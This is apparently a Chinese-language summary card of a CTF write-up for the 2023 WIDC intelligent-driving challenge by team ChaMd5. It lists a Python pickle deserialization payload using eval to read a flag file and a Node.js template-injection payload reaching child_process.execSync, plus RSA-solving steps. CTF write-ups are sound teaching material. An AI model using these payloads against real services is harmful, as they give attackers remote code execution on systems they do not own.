---
title: "2023 WIDC 世界智能驾驶挑战赛 writeup ChaMd5"
category: web
tags: ["2023 WIDC 世界智能驾驶挑战赛 (ChaMd5)", "web", "WIDC", "智能驾驶", "车联网", "pickle"]
signals: ["2023 WIDC 世界智能驾驶挑战赛 (ChaMd5) 2023", "WIDC", "智能驾驶", "车联网", "pickle", "range.constructor", "child_process.execSync", "RSA", "multi-prime", "deserialize", "rce", "web_unknown", "crypto_rsa", "Node"]
difficulty: hard
source: "https://www.ctfiot.com/112792.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2023 WIDC 世界智能驾驶挑战赛 writeup ChaMd5

> 赛事：2023 WIDC 世界智能驾驶挑战赛 (ChaMd5) 2023 | 方向：web | 难度：hard

## 一句话总结

2023 WIDC 智驾：pickle + Node template + RSA-1 sympy + RSA-2 gcd + pwn

## 攻击链

1. WEB deserialize: pickle 反序列化, builtins.getattr(dict.get(''eval'')(open(''/f1ag'').read()))
2. WEB template: {{range.constructor(''return global.process.mainModule.require("child_process").execSync("/flag")'')()}}
3. Crypto RSA-1: k = (e*info-1) // n, add = (e*info-1-k*n-k)//(e-k), sympy.solve(p+q=add, p*q=n) → p,q
4. flag = md5(str(p)+str(q))
5. Crypto RSA-2: a0 = pow(s-e,e) - b, a1 = pow(o-e,e) - a, p = gcd(a0, a1), q = (o-e)%p
6. flag = md5(str(p+q+r))

## 关键 payload

```
pickle: builtins.getattr(dict.get(''eval'')(open(''/f1ag'').read()))
```

## 经验教训

智驾安全涵盖 web + crypto + pwn；pickle 反序列化链 getattr/dict.get 经典

## 标签

WIDC、智能驾驶、车联网、pickle、range.constructor、child_process.execSync、RSA、multi-prime、e*info-1、sympy、智驾安全

## 参考来源

- https://www.ctfiot.com/112792.html
- 原文件：2023WIDC世界智能驾驶挑战赛_writeup_ChaMd5.full.md
